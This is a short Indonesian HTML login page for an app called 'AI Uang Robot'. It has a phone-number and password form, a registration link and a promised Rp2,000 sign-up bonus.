<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Uang Robot - Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="logo.png" alt="AI Uang Robot">
            <h1>AI Uang Robot</h1>
        </div>
        <form action="/dashboard.html" method="POST">
            <div class="input-group">
                <label for="phone">+62</label>
                <input type="tel" id="phone" name="phone" placeholder="Masukkan nomor telepon Anda" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Masukkan kata sandi" required>
            </div>
            <button type="submit" class="btn">Gabung</button>
        </form>
        <a href="/register" class="register-link">Belum punya akun? Daftar di sini</a>
        <p class="bonus-text">Dapatkan bonus Rp2.000 sekarang!</p>
    </div>
</body>
</html>
